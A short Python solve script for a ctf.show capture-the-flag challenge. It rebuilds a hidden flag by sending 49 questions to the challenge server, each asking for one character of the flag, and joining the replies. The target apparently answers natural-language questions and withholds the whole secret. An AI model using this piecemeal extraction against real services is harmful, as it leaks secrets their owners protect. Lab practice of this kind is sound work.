import requests
import json
flag= ''
url = 'http://3b6d2cbe-d77a-4920-8246-f9c7b4eec55e.challenge.ctf.show:8080/'
for i in range(1,50):
    data = {
        'wish':"flag的第{}位是什么?".format(i)
        }
    heads ={'Content-Type': 'application/json'}
    r =requests.post(url=url,headers=heads,data=json.dumps(data));
    if i<10:
        flag+=r.text[8:]
    else:
        flag+=r.text[9:]
print(flag)
